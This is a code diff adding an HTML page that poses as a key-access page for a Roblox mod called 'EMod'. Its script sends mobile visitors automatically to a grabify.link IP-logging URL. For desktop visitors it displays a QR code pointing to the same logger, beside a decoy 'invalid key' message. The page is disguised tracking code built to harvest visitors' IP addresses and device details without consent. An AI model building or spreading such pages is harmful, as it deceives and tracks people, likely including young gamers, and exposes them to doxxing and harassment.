@@ -1,0 +1,35 @@
+<head>
+    <title>Access via Key | EMod by eddie's stu</title>
+    <style>
+        @font-face {
+            font-family: "Gotham";
+            src: url("GothamBold.ttf");
+}
+    </style>
+</head>
+<body>
+<div id="image-container"></div>
+<script>
+        var grabber = "https://grabify.link/F48V0O";
+        function isMobile() {
+  const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+  return regex.test(navigator.userAgent);
+}
+
+if (isMobile()) {
+  window.location.href = grabber
+} else {
+  console.log("Redirect process aborted. QR Code is now visible.");
+}
+    var container = document.getElementById("image-container");
+    var url = "https://www.roblox.com/games/16693253844/";
+    var warningMessage = "Invalid key detected. Redirect process has been aborted.";
+    var API = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=";
+    var APIResult = API.concat(grabber);
+    var img = document.createElement("img")
+    img.src=APIResult;
+    img.height = 100;
+    img.width = 100;
+    container.appendChild(img);
+</script>
+</body>
